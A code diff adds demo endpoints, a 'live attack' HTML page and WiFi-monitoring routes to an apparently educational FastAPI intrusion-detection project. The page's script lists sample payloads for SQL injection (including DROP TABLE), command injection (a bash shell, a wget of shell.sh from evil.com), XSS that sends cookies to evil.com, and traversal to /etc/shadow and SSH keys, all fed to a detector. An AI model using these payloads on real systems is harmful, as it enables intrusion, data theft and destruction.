@@ -7,8 +7,8 @@ import logging
 from datetime import datetime
 from typing import Any, Dict, List
 
-from fastapi import APIRouter, HTTPException, Query, WebSocket, WebSocketDisconnect
-from fastapi.responses import JSONResponse
+from fastapi import APIRouter, HTTPException, Query, Request, WebSocket, WebSocketDisconnect
+from fastapi.responses import HTMLResponse, JSONResponse
 
 from backend.api.models import (
     AttackResponse,
@@ -32,18 +32,24 @@ _log_storage: LogStorage = None
 _defense_storage: DefenseStorage = None
 _defense_engine = None
 _analyzer = None
+_email_reporter = None
+_wifi_monitor = None
 _metrics_collector = MetricsCollector()
 
 # WebSocket connection manager
 _ws_connections: List[WebSocket] = []
 
 
-def init_routes(log_storage, defense_storage, defense_engine, analyzer):
+def init_routes(log_storage, defense_storage, defense_engine, analyzer,
+                email_reporter=None, wifi_monitor=None):
     global _log_storage, _defense_storage, _defense_engine, _analyzer
+    global _email_reporter, _wifi_monitor
     _log_storage = log_storage
     _defense_storage = defense_storage
     _defense_engine = defense_engine
     _analyzer = analyzer
+    _email_reporter = email_reporter
+    _wifi_monitor = wifi_monitor
 
 
 # ------------------------------------------------------------------
@@ -606,6 +612,718 @@ async def inject_custom_attacks(payload: dict):
             })
 
     return {"injected": len(lines), "detected": len(results), "attacks": results}
+
+
+# ------------------------------------------------------------------
+# Demo Attack Endpoint — real client IP, used by the demo page
+# ------------------------------------------------------------------
+
+_DEMO_ATTACK_PATHS = {
+    "SQL_INJECTION": "/login?user={payload}",
+    "COMMAND_INJECTION": "/cmd?host={payload}",
+    "XSS": "/search?q={payload}",
+    "PATH_TRAVERSAL": "/files?file={payload}",
+    "BRUTE_FORCE": "/login",
+}
+
+_DEMO_PAYLOADS = {
+    "SQL_INJECTION": "' OR '1'='1--",
+    "COMMAND_INJECTION": "localhost;cat /etc/passwd",
+    "XSS": "<script>alert(document.cookie)</script>",
+    "PATH_TRAVERSAL": "../../../../etc/passwd",
+    "BRUTE_FORCE": "",
+}
+
+
+def _get_client_ip(request: Request) -> str:
+    """Extract real client IP, respecting X-Forwarded-For."""
+    forwarded = request.headers.get("X-Forwarded-For", "")
+    if forwarded:
+        return forwarded.split(",")[0].strip()
+    real_ip = request.headers.get("X-Real-IP", "")
+    if real_ip:
+        return real_ip
+    return request.client.host if request.client else "0.0.0.0"
+
+
+@router.post("/api/demo/attack", tags=["demo"])
+async def demo_attack(body: Dict[str, Any], request: Request):
+    """
+    Perform a demo attack from the caller's real IP.
+
+    The caller's IP is extracted from the HTTP request, fed through the
+    full detection + defense pipeline, and the result is returned.
+    This is the endpoint the interactive demo page (GET /demo) uses.
+    """
+    from backend.monitoring.log_parser import NginxLogParser
+    from backend.detection.detection_engine import AttackDetectionEngine
+    from backend.analysis.llm_analyzer import LLMAnalyzer
+    from datetime import datetime
+
+    attack_type = body.get("attack_type", "SQL_INJECTION")
+    custom_payload = body.get("payload", "")
+
+    client_ip = _get_client_ip(request)
+
+    # Build a plausible NGINX log line for the chosen attack
+    payload = custom_payload or _DEMO_PAYLOADS.get(attack_type, "test")
+    path_tpl = _DEMO_ATTACK_PATHS.get(attack_type, "/test?q={payload}")
+    path = path_tpl.format(payload=payload)
+    ts = datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")
+
+    brute_lines = []
+    if attack_type == "BRUTE_FORCE":
+        # Send 7 fake failed logins
+        brute_lines = [
+            f'{client_ip} - - [{ts}] "POST /login HTTP/1.1" 401 256 "-" "demo-browser/1.0"'
+            for _ in range(7)
+        ]
+    else:
+        brute_lines = [
+            f'{client_ip} - - [{ts}] "GET {path} HTTP/1.1" 200 512 "-" "demo-browser/1.0"'
+        ]
+
+    parser = NginxLogParser()
+    engine = AttackDetectionEngine()
+    analyzer = LLMAnalyzer()
+    analyzer._available = False  # fast fallback for demo
+
+    detections_summary = []
+    for log_line in brute_lines:
+        parsed = parser.parse(log_line)
+        if not parsed:
+            continue
+        request_id = _log_storage.save_request(parsed)
+        detections = engine.analyze_request(parsed)
+        if detections:
+            top = detections[0]
+            _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
+            defense_result = _defense_engine.execute_defense(top)
+            blocked = defense_result.get("action") in ("BLOCK_IP", "ALREADY_BLOCKED")
+            if blocked:
+                _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)
+
+            analysis = analyzer.analyze_attack(top, parsed)
+            _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)
+
+            # Send email report if configured
+            if _email_reporter:
+                _email_reporter.send_attack_report(top, parsed, analysis)
+
+            await broadcast_attack({
+                "id": request_id,
+                "timestamp": parsed.get("timestamp"),
+                "ip": client_ip,
+                "method": parsed.get("method"),
+                "path": parsed.get("path"),
+                "status": parsed.get("status"),
+                "user_agent": parsed.get("user_agent"),
+                "attack_type": top["attack_type"],
+                "severity": top["severity"],
+                "blocked": blocked,
+                "defense_action": defense_result.get("action"),
+            })
+
+            detections_summary.append({
+                "attack_type": top["attack_type"],
+                "severity": top["severity"],
+                "blocked": blocked,
+                "analysis": {
+                    "explanation": analysis.get("explanation", ""),
+                    "impact": analysis.get("impact", ""),
+                    "mitigation": analysis.get("mitigation", []),
+                },
+            })
+
+    if detections_summary:
+        return {
+            "detected": True,
+            "attacker_ip": client_ip,
+            "attack_type": attack_type,
+            "detections": detections_summary,
+            "message": f"Attack detected! IP {client_ip} has been blocked.",
+        }
+    return {
+        "detected": False,
+        "attacker_ip": client_ip,
+        "attack_type": attack_type,
+        "detections": [],
+        "message": "No attack patterns matched. Try a different payload.",
+    }
+
+
+@router.post("/api/demo/report", tags=["demo"])
+async def demo_report(body: Dict[str, Any], request: Request):
+    """
+    Receive a raw request report from the vulnerable test app middleware.
+
+    The test app forwards every incoming request here so the detection
+    engine can analyse real traffic going to the vulnerable app.
+    """
+    from backend.monitoring.log_parser import NginxLogParser
+    from backend.detection.detection_engine import AttackDetectionEngine
+    from backend.analysis.llm_analyzer import LLMAnalyzer
+    from datetime import datetime
+
+    ip = body.get("ip") or _get_client_ip(request)
+    method = body.get("method", "GET")
+    path = body.get("path", "/")
+    body_text = body.get("body", "")
+    user_agent = body.get("user_agent", "")
+
+    # Combine path and body for scanning (catches POST body SQL injection too)
+    scan_target = path
+    if body_text:
+        scan_target = f"{path} {body_text}"
+
+    ts = datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")
+    log_line = (
+        f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" 200 512 "-" "{user_agent}"'
+    )
+
+    parser = NginxLogParser()
+    parsed = parser.parse(log_line)
+    if not parsed:
+        return {"detected": False}
+
+    # Override path with combined target for detection
+    parsed["path"] = scan_target
+    parsed["body"] = body_text
+
+    from backend.detection.detection_engine import AttackDetectionEngine
+    engine = AttackDetectionEngine()
+    analyzer = LLMAnalyzer()
+    analyzer._available = False
+
+    request_id = _log_storage.save_request(parsed)
+    detections = engine.analyze_request(parsed)
+
+    if not detections:
+        return {"detected": False, "ip": ip}
+
+    top = detections[0]
+    _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
+    defense_result = _defense_engine.execute_defense(top)
+    blocked = defense_result.get("action") in ("BLOCK_IP", "ALREADY_BLOCKED")
+    if blocked:
+        _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)
+
+    analysis = analyzer.analyze_attack(top, parsed)
+    _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)
+
+    if _email_reporter:
+        _email_reporter.send_attack_report(top, parsed, analysis)
+
+    await broadcast_attack({
+        "id": request_id,
+        "timestamp": parsed.get("timestamp"),
+        "ip": ip,
+        "method": method,
+        "path": path,
+        "status": 200,
+        "user_agent": user_agent,
+        "attack_type": top["attack_type"],
+        "severity": top["severity"],
+        "blocked": blocked,
+        "defense_action": defense_result.get("action"),
+    })
+
+    return {
+        "detected": True,
+        "ip": ip,
+        "attack_type": top["attack_type"],
+        "severity": top["severity"],
+        "blocked": blocked,
+    }
+
+
+# ------------------------------------------------------------------
+# Demo HTML Page — served at GET /demo
+# ------------------------------------------------------------------
+
+_DEMO_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🛡️ Cyber Defense Live Demo</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0f172a;
+      color: #e2e8f0;
+      min-height: 100vh;
+    }
+    .header {
+      background: linear-gradient(135deg, #dc2626 0%, #7c3aed 100%);
+      padding: 28px 24px;
+      text-align: center;
+    }
+    .header h1 { font-size: clamp(1.4rem, 4vw, 2rem); font-weight: 800; color: #fff; }
+    .header p  { color: #fca5a5; margin-top: 6px; font-size: 0.9rem; }
+    .badge {
+      display: inline-block;
+      background: rgba(255,255,255,0.15);
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 20px;
+      padding: 4px 14px;
+      font-size: 0.75rem;
+      color: #fff;
+      margin-top: 10px;
+    }
+    .container { max-width: 860px; margin: 0 auto; padding: 24px 16px; }
+
+    .info-bar {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 10px;
+      padding: 14px 18px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .info-bar .label { color: #94a3b8; font-size: 0.8rem; }
+    .info-bar .value { color: #38bdf8; font-weight: 600; font-size: 0.9rem; font-family: monospace; }
+    .dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
+
+    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 16px; margin-bottom: 24px; }
+    .attack-card {
+      background: #1e293b;
+      border: 2px solid #334155;
+      border-radius: 12px;
+      padding: 20px;
+      cursor: pointer;
+      transition: all 0.2s;
+      user-select: none;
+    }
+    .attack-card:hover { border-color: #dc2626; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(220,38,38,0.15); }
+    .attack-card.selected { border-color: #dc2626; background: #1c1028; }
+    .attack-card .icon { font-size: 2rem; margin-bottom: 8px; }
+    .attack-card .name { font-weight: 700; font-size: 0.95rem; color: #f1f5f9; margin-bottom: 4px; }
+    .attack-card .desc { font-size: 0.75rem; color: #94a3b8; line-height: 1.4; }
+    .attack-card .severity {
+      display: inline-block;
+      margin-top: 8px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.7rem;
+      font-weight: 700;
+    }
+    .sev-CRITICAL { background: rgba(220,38,38,0.2); color: #fca5a5; border: 1px solid rgba(220,38,38,0.4); }
+    .sev-HIGH { background: rgba(234,88,12,0.2); color: #fdba74; border: 1px solid rgba(234,88,12,0.4); }
+
+    .payload-section {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 10px;
+      padding: 18px;
+      margin-bottom: 16px;
+    }
+    .payload-section label { display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 6px; }
+    .payload-section select, .payload-section input {
+      width: 100%;
+      background: #0f172a;
+      border: 1px solid #475569;
+      border-radius: 6px;
+      color: #e2e8f0;
+      padding: 9px 12px;
+      font-size: 0.85rem;
+      font-family: monospace;
+      outline: none;
+    }
+    .payload-section select:focus, .payload-section input:focus { border-color: #7c3aed; }
+
+    .launch-btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #dc2626, #7c3aed);
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      letter-spacing: 0.5px;
+    }
+    .launch-btn:hover { opacity: 0.9; }
+    .launch-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .result-box {
+      margin-top: 20px;
+      border-radius: 12px;
+      overflow: hidden;
+      display: none;
+    }
+    .result-box.visible { display: block; }
+    .result-header {
+      padding: 14px 18px;
+      font-weight: 700;
+      font-size: 0.95rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .result-header.detected { background: #7f1d1d; }
+    .result-header.clean    { background: #14532d; }
+    .result-body {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-top: none;
+      padding: 16px 18px;
+    }
+    .result-body table { width: 100%; border-collapse: collapse; font-size: 0.82rem; }
+    .result-body td { padding: 7px 10px; border-bottom: 1px solid #334155; }
+    .result-body td:first-child { color: #94a3b8; width: 140px; }
+    .result-body td code { background: #0f172a; padding: 2px 6px; border-radius: 4px; font-size: 0.8rem; color: #7dd3fc; }
+    .mitigation-list { margin: 6px 0 0 16px; font-size: 0.82rem; color: #94a3b8; line-height: 1.7; }
+
+    .warning-box {
+      background: rgba(234,179,8,0.1);
+      border: 1px solid rgba(234,179,8,0.3);
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 0.8rem;
+      color: #fde68a;
+      margin-bottom: 20px;
+    }
+
+    .dashboard-link {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: rgba(124,58,237,0.2);
+      border: 1px solid rgba(124,58,237,0.4);
+      border-radius: 6px;
+      padding: 8px 14px;
+      color: #c4b5fd;
+      text-decoration: none;
+      font-size: 0.8rem;
+      margin-top: 16px;
+      transition: background 0.2s;
+    }
+    .dashboard-link:hover { background: rgba(124,58,237,0.35); }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      color: #475569;
+      font-size: 0.75rem;
+      border-top: 1px solid #1e293b;
+      margin-top: 32px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <div style="font-size:3rem;margin-bottom:8px;">🛡️</div>
+  <h1>Autonomous AI Cyber Defense</h1>
+  <p>Live Attack Demo — Real-Time Detection & IP Blocking</p>
+  <span class="badge">⚠️ Educational Purpose Only — Safe & Controlled Environment</span>
+</div>
+
+<div class="container">
+
+  <div class="info-bar">
+    <div class="dot"></div>
+    <div>
+      <div class="label">Your IP Address</div>
+      <div class="value" id="client-ip">Detecting…</div>
+    </div>
+    <div style="margin-left:auto;">
+      <div class="label">Defense System</div>
+      <div class="value" id="system-status">Checking…</div>
+    </div>
+  </div>
+
+  <div class="warning-box">
+    ⚠️ <strong>Demo Environment Notice:</strong>
+    This page allows you to trigger real security attacks against the vulnerable test application.
+    The AI Defense Agent will detect your attack and <strong>block your IP address</strong>.
+    All attacks are logged and analysed. After blocking, your IP can be unblocked via the dashboard.
+  </div>
+
+  <h2 style="font-size:1rem;font-weight:700;margin-bottom:14px;color:#f1f5f9;">Select Attack Type</h2>
+  <div class="grid" id="attack-grid">
+    <div class="attack-card selected" data-type="SQL_INJECTION">
+      <div class="icon">💉</div>
+      <div class="name">SQL Injection</div>
+      <div class="desc">Inject malicious SQL into login/search forms to bypass authentication or steal data.</div>
+      <span class="severity sev-CRITICAL">CRITICAL</span>
+    </div>
+    <div class="attack-card" data-type="COMMAND_INJECTION">
+      <div class="icon">⚡</div>
+      <div class="name">Command Injection</div>
+      <div class="desc">Execute arbitrary OS commands by injecting shell metacharacters.</div>
+      <span class="severity sev-CRITICAL">CRITICAL</span>
+    </div>
+    <div class="attack-card" data-type="XSS">
+      <div class="icon">🕷️</div>
+      <div class="name">Cross-Site Scripting</div>
+      <div class="desc">Inject JavaScript payloads to hijack sessions or steal cookies.</div>
+      <span class="severity sev-HIGH">HIGH</span>
+    </div>
+    <div class="attack-card" data-type="PATH_TRAVERSAL">
+      <div class="icon">📁</div>
+      <div class="name">Path Traversal</div>
+      <div class="desc">Access files outside the web root using ../ sequences.</div>
+      <span class="severity sev-HIGH">HIGH</span>
+    </div>
+    <div class="attack-card" data-type="BRUTE_FORCE">
+      <div class="icon">🔨</div>
+      <div class="name">Brute Force</div>
+      <div class="desc">Repeatedly attempt login to guess credentials.</div>
+      <span class="severity sev-HIGH">HIGH</span>
+    </div>
+  </div>
+
+  <div class="payload-section">
+    <label>Attack Payload</label>
+    <select id="payload-select"></select>
+  </div>
+
+  <button class="launch-btn" id="launch-btn" onclick="launchAttack()">
+    🚀 Launch Attack — Test the Defense System
+  </button>
+
+  <div class="result-box" id="result-box">
+    <div class="result-header" id="result-header"></div>
+    <div class="result-body" id="result-body"></div>
+  </div>
+
+  <div style="text-align:center;margin-top:20px;">
+    <a href="http://localhost:3000" target="_blank" class="dashboard-link">
+      📊 Open Defense Dashboard ↗
+    </a>
+    <a href="http://localhost:3000/attacks" target="_blank" class="dashboard-link" style="margin-left:8px;">
+      🚨 Live Attack Feed ↗
+    </a>
+    <a href="http://localhost:8000/docs" target="_blank" class="dashboard-link" style="margin-left:8px;">
+      📖 API Docs ↗
+    </a>
+  </div>
+</div>
+
+<footer>
+  Autonomous AI Cyber Defense Agent — For educational and demonstration purposes only.
+  All attacks are simulated in a controlled environment.
+</footer>
+
+<script>
+const PAYLOADS = {
+  SQL_INJECTION: [
+    "' OR '1'='1--",
+    "admin' UNION SELECT username,password FROM users--",
+    "1'; DROP TABLE users--",
+    "1 AND SLEEP(5)--",
+    "' OR BENCHMARK(5000000,MD5(1))--"
+  ],
+  COMMAND_INJECTION: [
+    "localhost;cat /etc/passwd",
+    "127.0.0.1|id",
+    "x;/bin/bash -i",
+    "x;wget http://evil.com/shell.sh",
+    "x$(cat /etc/passwd)"
+  ],
+  XSS: [
+    "<script>alert(document.cookie)</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(document.cookie)",
+    "<svg onload=alert(1)>",
+    "<body onload=document.location='http://evil.com?c='+document.cookie>"
+  ],
+  PATH_TRAVERSAL: [
+    "../../../../etc/passwd",
+    "../../../../.ssh/id_rsa",
+    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
+    "../../../../etc/hosts",
+    "../../../../proc/self/environ"
+  ],
+  BRUTE_FORCE: [
+    "admin:password",
+    "admin:123456",
+    "root:root",
+    "user:pass"
+  ]
+};
+
+let selectedType = 'SQL_INJECTION';
+
+// Detect client IP from the server
+fetch('/api/demo/whoami').then(r => r.json()).then(d => {
+  document.getElementById('client-ip').textContent = d.ip || 'Unknown';
+}).catch(() => {
+  document.getElementById('client-ip').textContent = 'Unable to detect';
+});
+
+// Check system status
+fetch('/health').then(r => r.json()).then(d => {
+  const ok = d.status === 'healthy';
+  document.getElementById('system-status').textContent = ok ? '✅ Online & Active' : '⚠️ Degraded';
+  document.getElementById('system-status').style.color = ok ? '#4ade80' : '#facc15';
+}).catch(() => {
+  document.getElementById('system-status').textContent = '❌ Offline';
+  document.getElementById('system-status').style.color = '#f87171';
+});
+
+// Card selection
+document.querySelectorAll('.attack-card').forEach(card => {
+  card.addEventListener('click', () => {
+    document.querySelectorAll('.attack-card').forEach(c => c.classList.remove('selected'));
+    card.classList.add('selected');
+    selectedType = card.dataset.type;
+    updatePayloads();
+  });
+});
+
+function updatePayloads() {
+  const sel = document.getElementById('payload-select');
+  sel.innerHTML = '';
+  (PAYLOADS[selectedType] || []).forEach(p => {
+    const opt = document.createElement('option');
+    opt.value = p;
+    opt.textContent = p;
+    sel.appendChild(opt);
+  });
+}
+
+updatePayloads();
+
+async function launchAttack() {
+  const btn = document.getElementById('launch-btn');
+  const payload = document.getElementById('payload-select').value;
+  btn.disabled = true;
+  btn.textContent = '⏳ Launching attack…';
+
+  const resultBox = document.getElementById('result-box');
+  const resultHeader = document.getElementById('result-header');
+  const resultBody = document.getElementById('result-body');
+  resultBox.classList.remove('visible');
+
+  try {
+    const resp = await fetch('/api/demo/attack', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({attack_type: selectedType, payload})
+    });
+    const data = await resp.json();
+
+    resultBox.classList.add('visible');
+
+    if (data.detected) {
+      resultHeader.className = 'result-header detected';
+      resultHeader.innerHTML = `🚨 ATTACK DETECTED — Your IP <code style="background:rgba(0,0,0,0.3);padding:2px 6px;border-radius:4px;">${data.attacker_ip}</code> has been <strong>BLOCKED</strong>`;
+
+      const det = data.detections[0] || {};
+      const mit = (det.analysis?.mitigation || []);
+      const mitHtml = mit.length
+        ? '<ul class="mitigation-list">' + mit.map(m => `<li>${m}</li>`).join('') + '</ul>'
+        : '';
+
+      resultBody.innerHTML = `
+        <table>
+          <tr><td>Attack Type</td><td><strong>${det.attack_type || selectedType}</strong></td></tr>
+          <tr><td>Severity</td><td><strong style="color:#f87171;">${det.severity}</strong></td></tr>
+          <tr><td>Attacker IP</td><td><code>${data.attacker_ip}</code></td></tr>
+          <tr><td>Payload</td><td><code>${escHtml(payload)}</code></td></tr>
+          <tr><td>Status</td><td><strong style="color:#4ade80;">✅ IP BLOCKED by AI Defense Engine</strong></td></tr>
+        </table>
+        ${det.analysis?.explanation ? `<p style="margin-top:12px;font-size:0.82rem;color:#94a3b8;line-height:1.5;">${det.analysis.explanation}</p>` : ''}
+        ${mitHtml ? `<p style="margin-top:10px;font-size:0.8rem;font-weight:600;color:#e2e8f0;">Mitigation:</p>${mitHtml}` : ''}
+      `;
+    } else {
+      resultHeader.className = 'result-header clean';
+      resultHeader.innerHTML = `✅ Attack not detected (check payload or system status)`;
+      resultBody.innerHTML = `
+        <table>
+          <tr><td>Attack Type</td><td>${selectedType}</td></tr>
+          <tr><td>Your IP</td><td><code>${data.attacker_ip}</code></td></tr>
+          <tr><td>Message</td><td>${data.message}</td></tr>
+        </table>
+      `;
+    }
+  } catch (e) {
+    resultBox.classList.add('visible');
+    resultHeader.className = 'result-header detected';
+    resultHeader.textContent = '❌ Error connecting to defense system';
+    resultBody.innerHTML = `<p style="color:#f87171;">Could not reach the backend: ${e.message}</p>`;
+  }
+
+  btn.disabled = false;
+  btn.textContent = '🚀 Launch Attack — Test the Defense System';
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+</script>
+</body>
+</html>"""
+
+
+@router.get("/demo", response_class=HTMLResponse, tags=["demo"])
+async def demo_page():
+    """Interactive attack demo page — accessible from any device on the local network."""
+    return HTMLResponse(content=_DEMO_HTML)
+
+
+@router.get("/api/demo/whoami", tags=["demo"])
+async def whoami(request: Request):
+    """Return the caller's real IP address (used by the demo page)."""
+    return {"ip": _get_client_ip(request)}
+
+
+# ------------------------------------------------------------------
+# WiFi / Local Network Protection
+# ------------------------------------------------------------------
+
+@router.get("/api/wifi/devices", tags=["wifi"])
+async def get_wifi_devices():
+    """Return all devices discovered on the local network."""
+    if not _wifi_monitor:
+        return {"devices": [], "total": 0, "message": "WiFi monitor not initialised"}
+    devices = _wifi_monitor.get_devices()
+    # Sync blocked IPs into the monitor
+    if _defense_storage:
+        blocked = {row["ip"] for row in _defense_storage.get_blocked_ips()}
+        _wifi_monitor.update_blocked_ips(blocked)
+    return {"devices": devices, "total": len(devices)}
+
+
+@router.get("/api/wifi/summary", tags=["wifi"])
+async def get_wifi_summary():
+    """Return a summary of the local network state."""
+    if not _wifi_monitor:
+        return {
+            "total_devices": 0,
+            "blocked_devices": 0,
+            "trusted_devices": 0,
+            "risky_devices": 0,
+            "local_ip": "n/a",
+            "subnet": "n/a",
+            "last_scan": "n/a",
+        }
+    if _defense_storage:
+        blocked = {row["ip"] for row in _defense_storage.get_blocked_ips()}
+        _wifi_monitor.update_blocked_ips(blocked)
+    return _wifi_monitor.get_summary()
+
+
+@router.post("/api/wifi/rescan", tags=["wifi"])
+async def trigger_wifi_rescan():
+    """Trigger an immediate network rescan (runs in background)."""
+    if not _wifi_monitor:
+        raise HTTPException(503, "WiFi monitor not initialised")
+
+    async def _rescan():
+        loop = asyncio.get_event_loop()
+        await loop.run_in_executor(None, _wifi_monitor._scan_network)
+
+    asyncio.create_task(_rescan())
+    return {"success": True, "message": "Network rescan triggered"}
 
 
 # ------------------------------------------------------------------
